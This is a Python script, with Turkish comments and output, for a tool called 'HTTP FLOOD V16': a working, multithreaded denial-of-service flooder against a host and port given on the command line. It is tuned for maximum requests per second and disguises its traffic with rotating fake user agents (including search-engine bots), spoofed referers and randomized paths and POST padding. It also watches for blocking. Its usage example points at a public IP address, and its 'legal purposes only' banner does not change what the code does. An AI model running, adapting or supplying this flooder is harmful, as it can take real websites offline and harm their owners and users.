#!/usr/bin/python3
# -*- coding: utf-8 -*-

# OZCTN DEVELOPER - HTTP FLOOD V16 (Maksimum RPS Odaklı)
# Yüksek RPS hedefi için TIMEOUT ve WORKER_DELAY optimize edildi.

import time
import socket
import threading
import random
import sys
import ssl
import traceback

# =================================================================
# TARGET CONFIG (Komut satırı argümanlarından okunur)
# =================================================================
DEFAULT_HOST = "127.0.0.1" 
DEFAULT_PORT = 80
DEFAULT_WORKERS = 500

TARGET_HOST = DEFAULT_HOST
TARGET_PORT = DEFAULT_PORT
MAX_WORKERS = DEFAULT_WORKERS

USE_HTTPS = False
TIMEOUT = 3 # CRITICAL: Hızlı yanıt alınamayan bağlantıdan vazgeçmek için geri çekildi
WORKER_DELAY = 0.0 # CRITICAL: Worker'ları anında çalıştırmak için gecikme sıfırlandı

# Komut Satırı Argümanlarını Oku
if len(sys.argv) >= 2: TARGET_HOST = sys.argv[1]
if len(sys.argv) >= 3:
    try: TARGET_PORT = int(sys.argv[2])
    except ValueError: print(f"Hata: Port ({sys.argv[2]}) geçerli bir tamsayı değil. Varsayılan {DEFAULT_PORT} kullanılıyor.")
if len(sys.argv) >= 4:
    try: MAX_WORKERS = int(sys.argv[3])
    except ValueError: print(f"Hata: Worker sayısı ({sys.argv[3]}) geçerli bir tamsayı değil. Varsayılan {DEFAULT_WORKERS} kullanılıyor.")
        
if len(sys.argv) < 4:
    print("\n⚠️ Eksik Argümanlar! Varsayılan Değerler Kullanılacak VEYSA Hedef Belirlenmedi.")
    print(f"Kullanım: python3 script.py <Hedef IP> <Port> <Worker Sayısı>")
    print(f"Örnek: python3 script.py 138.201.139.144 80 1000")
    print("-" * 50)
# =================================================================

# Global Hata Yöneticisi
class GlobalFailureManager:
    """Hata sayacını ve kilidi bir arada tutar."""
    def __init__(self):
        self.count = 0
        self.lock = threading.Lock()

# Global nesnemizi tanımlıyoruz
GLOBAL_FAILURES = GlobalFailureManager()


# Global Listeler (Aynı Kalır)
BOT_REFERERS = [
    "http://validator.w3.org/check?uri=", "http://www.facebook.com/sharer/sharer.php?u=", 
    "https://web.telegram.org/sharer/sharer.php?url=", "https://t.co/i/", 
    "https://t.me/share/url?url=", "https://developers.google.com/speed/pagespeed/insights/?url=", 
    "https://www.google.com/url?q=", "https://l.instagram.com/?u=", 
    "https://www.linkedin.com/sharing/share-offsite/?url=", "https://www.pinterest.com/pin/create/button/?url=", 
    "https://www.reddit.com/submit?url=", "https://www.bing.com/search?q=", 
    "https://duckduckgo.com/?q=", "https://yandex.com/search/?text=", 
    "https://check-host.net/?host=", "https://gtmetrix.com/?url=", 
    "https://neilpatel.com/seo-analyzer/?url=",
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
    "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.16) Gecko/20110308 Ubuntu/10.04 (lucid) Firefox/3.6.16",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15",
]
PATHS = [
    '/', '/index.html', '/api/v1', '/wp-admin', '/static/main.css', 
    '/gizlilik-politikasi', '/uye-girisi', '/sepet', '/hizmetlerimiz', 
    '/urunler?kategori=1', '/blog/makale-15',
    f'/?rastgele={random.randint(10000, 99999)}', 
    f'/search?q=test&page={random.randint(1, 50)}',
    '/contact-us', '/about-us', '/feed/rss', '/admin/login.php',
    '/sitemap.xml', '/robots.txt', '/image/logo.png', '/js/app.js',
    '/style/theme.css', '/checkout/shipping/address', '/user/profile/settings',
    f'/makaleler/detay/{random.randint(100, 500)}',
    f'/kullanici/{random.choice(["ali", "veli", "can"])}/yorumlar',
    f'/product/view/{random.randint(1, 999)}?color={random.choice(["red", "blue", "green"])}',
    f'/dynamic-page/{time.time()}'
]
LANGUAGES = [
    'en-US,en;q=0.9', 'tr-TR,tr;q=0.8', 'de-DE,de;q=0.7', 'fr-FR,fr;q=0.6',
    'es-ES,es;q=0.5', 'zh-CN,zh;q=0.4', 'it-IT,it;q=0.3', 'ru-RU,ru;q=0.2',
    'ja-JP,ja;q=0.1', 'pt-BR,pt;q=0.1', 'ko-KR,ko;q=0.1', 'ar-SA,ar;q=0.1',
    'pl-PL,pl;q=0.1', 'nl-NL,nl;q=0.1', 'sv-SE,sv;q=0.1', 'id-ID,id;q=0.1',
]


class HTTPAttacker:
    def __init__(self, target_host, target_port, use_https=False):
        self.target_host = target_host
        self.target_port = target_port
        self.use_https = use_https
        self.sock = None
        self.requests_sent = 0
        self.success_count = 0
        self.failed_count = 0
    
    def get_random_user_agent(self):
        return random.choice(USER_AGENTS)
    
    def create_socket_connection(self):
        """Direkt Socket bağlantısı oluştur"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        
        try:
            sock.connect((self.target_host, self.target_port))
            
            if self.use_https:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target_host)
            
            return sock

        except Exception as e:
            if sock:
                sock.close()
            raise e
    
    def generate_http_request(self):
        """HTTP isteği oluştur (Keep-Alive, Çeşitlilik ve Bot Referer dahil)"""
        method = random.choice(['GET', 'POST', 'HEAD'])
        path = random.choice(PATHS)
        user_agent = self.get_random_user_agent()
        language = random.choice(LANGUAGES)
        bot_base = random.choice(BOT_REFERERS)
        
        protocol = 'https' if self.use_https else 'http'
        target_url = f"{protocol}://{self.target_host}:{self.target_port}"
        
        referer_header = bot_base + target_url
        
        if method == 'POST':
            post_data = 'data=' + 'A' * random.randint(500, 1500) 
            request = (
                f"{method} {path} HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                f"Accept-Language: {language}\r\n"  
                f"Referer: {referer_header}\r\n" 
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(post_data)}\r\n"
                f"Connection: Keep-Alive\r\n\r\n" 
                f"{post_data}"
            )
        else:
            request = (
                f"{method} {path} HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                f"Accept-Language: {language}\r\n" 
                f"Referer: {referer_header}\r\n" 
                f"Connection: Keep-Alive\r\n\r\n" 
            )
        
        return request.encode('utf-8')
    
    def close_and_reset_socket(self):
        if self.sock:
            self.sock.close()
        self.sock = None
    
    def adaptive_cooldown(self):
        """AI mantığı: Global hata sayısına göre bekleme süresini ayarlar."""
        with GLOBAL_FAILURES.lock:
            current_failed = GLOBAL_FAILURES.count 
        
        max_wait = min(5, current_failed / 1000) 
        wait_time = random.uniform(0.1, max_wait if max_wait > 0.1 else 0.1)
        time.sleep(wait_time)


    def send_request(self):
        
        if not self.sock:
            try:
                self.sock = self.create_socket_connection()
            except Exception as e:
                with GLOBAL_FAILURES.lock:
                    GLOBAL_FAILURES.count += 1 
                self.failed_count += 1
                self.adaptive_cooldown() 
                self.close_and_reset_socket()
                return False

        try:
            request_data = self.generate_http_request()
            self.sock.sendall(request_data) 
            
            self.sock.recv(1024) 
            
            self.requests_sent += 1
            self.success_count += 1
            return True
            
        except (socket.error, ssl.SSLError, ConnectionResetError, socket.timeout, BrokenPipeError) as e:
            with GLOBAL_FAILURES.lock:
                GLOBAL_FAILURES.count += 1 
            self.failed_count += 1
            self.adaptive_cooldown()
            self.close_and_reset_socket()
            return False

class AttackMonitor:
    def __init__(self):
        self.start_time = time.time()
        self.total_requests = 0
        self.total_success = 0
        self.total_failed = 0
        self.last_requests = 0
        self.last_time = time.time()
        self.lock = threading.Lock()
    
    def update(self, requests, success, failed):
        with self.lock:
            self.total_requests += requests
            self.total_success += success
            self.total_failed += failed
    
    def get_stats(self):
        with self.lock:
            current_time = time.time()
            elapsed = current_time - self.start_time
            
            recent_requests = self.total_requests - self.last_requests
            recent_time = current_time - self.last_time
            current_rps = recent_requests / recent_time if recent_time > 0 else 0
            
            self.last_requests = self.total_requests
            self.last_time = current_time
            
            avg_rps = self.total_requests / elapsed if elapsed > 0 else 0
            
            return {
                'total_requests': self.total_requests,
                'total_success': self.total_success,
                'total_failed': self.total_failed,
                'current_rps': current_rps,
                'avg_rps': avg_rps,
                'elapsed': elapsed
            }

def attack_worker(worker_id, attacker, monitor):
    """Saldırı worker'ı"""
    
    request_count = 0
    
    while True:
        try:
            success = attacker.send_request() 
            
            if success:
                request_count += 1
                
                # CRITICAL: Yüksek RPS için gecikme sıfırlandı
                # time.sleep(WORKER_DELAY) 
                
                if request_count % 100 == 0:
                    print(f"✅ WORKER {worker_id}: {request_count} başarılı istek gönderdi.")
            
            monitor.update(
                attacker.requests_sent,
                attacker.success_count, 
                attacker.failed_count
            )
            
            attacker.requests_sent = 0
            attacker.success_count = 0
            attacker.failed_count = 0
            
        except Exception as e:
            continue

def start_attack():
    """Saldırıyı başlat"""
    print("🎯 HEDEF KONTROLÜ YAPILIYOR...")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((TARGET_HOST, TARGET_PORT))
        sock.close()
        
        if result == 0:
            print(f"✅ {TARGET_HOST}:{TARGET_PORT} - ERİŞİLEBİLİR")
        else:
            print(f"❌ {TARGET_HOST}:{TARGET_PORT} - ERİŞİLEMEZ!")
            return None, None, None
    except Exception as e:
        print(f"❌ Bağlantı hatası: {e}")
        return None, None, None
    
    print(f"💥 SALDIRI BAŞLATILIYOR...")
    print(f"🎯 Hedef: {TARGET_HOST}:{TARGET_PORT}")
    print(f"👥 Worker: {MAX_WORKERS}")
    print(f"⏱️ Timeout: {TIMEOUT}s (Hızlı Vazgeçme)")
    print(f"⚡ Hız Odaklı: WORKER GECİKMESİ SIFIRLANDI")
    print("🔄 Bağlantı: DİREKT (PROXY KAPALI)")
    
    attackers = []
    for i in range(MAX_WORKERS):
        attacker = HTTPAttacker(TARGET_HOST, TARGET_PORT, USE_HTTPS)
        attackers.append(attacker)
    
    monitor = AttackMonitor()
    
    threads = []
    for i, attacker in enumerate(attackers):
        thread = threading.Thread(target=attack_worker, args=(i, attacker, monitor))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    return attackers, threads, monitor

def monitor_attack(attackers, monitor):
    """Saldırıyı izle"""
    print("\n📊 SALDIRI İZLEME BAŞLATILDI...")
    print("=" * 50)
    
    last_total = 0
    stuck_count = 0
    
    while True:
        time.sleep(3)
        stats = monitor.get_stats()
        
        if stats['total_requests'] == last_total:
            stuck_count += 1
        else:
            stuck_count = 0
        
        last_total = stats['total_requests']
        
        success_rate = (stats['total_success'] / stats['total_requests'] * 100) if stats['total_requests'] > 0 else 0
        
        print(f"📈 Anlık RPS: {stats['current_rps']:.1f}")
        print(f"📊 Ortalama RPS: {stats['avg_rps']:.1f}")
        print(f"📦 Toplam İstek: {stats['total_requests']}")
        print(f"✅ Başarı: {stats['total_success']} (%{success_rate:.1f})")
        print(f"❌ Hata: {stats['total_failed']}")
        print(f"⏰ Süre: {stats['elapsed']:.1f}s")
        
        if stuck_count > 3 and stats['current_rps'] < 10:
            print("⚠️  UYARI: Trafik kısıtlanıyor/engelleniyor olabilir!")
        
        print("-" * 50)

def main():
    print("""
    \033[91m
    ╔═══════════════════════════════════════════════╗
    ║              OZCTN DEVELOPER                 ║
    ║        HTTP FLOOD V16 (Maksimum RPS)         ║
    ║               TEST EDİLMİŞ                   ║
    ║         Only for Legal Purposes              ║
    ╚═══════════════════════════════════════════════╝
    \033[0m
    """)
    
    print("🔍 ÖNEMLİ: Bu kod sadece kendi sunucunuzun performansını test etme amaçlıdır!")
    print("⚠️  Yasal olmayan kullanımdan sorumlu değilim!\n")
    
    try:
        attackers, threads, monitor = start_attack()
        if attackers is None:
            print("❌ Test başlatılamadı! Hedef ve port ayarlarını kontrol edin.")
            return
        
        print("\n🚀 3 saniye içinde test başlatılıyor...")
        for i in range(3, 0, -1):
            print(f"⏰ {i}...")
            time.sleep(1)
        
        monitor_attack(attackers, monitor)
        
    except KeyboardInterrupt:
        stats = monitor.get_stats()
        print(f"\n🛑 TEST DURDURULDU")
        print(f"📊 SONUÇLAR:")
        print(f"   Toplam İstek: {stats['total_requests']}")
        print(f"   Başarılı: {stats['total_success']}")
        print(f"   Başarısız: {stats['total_failed']}")
        print(f"   Ortalama RPS: {stats['avg_rps']:.1f}")
        
    except Exception as e:
        print(f"\n❌ Ana program hatası: {e}")

if __name__ == "__main__":
    main()
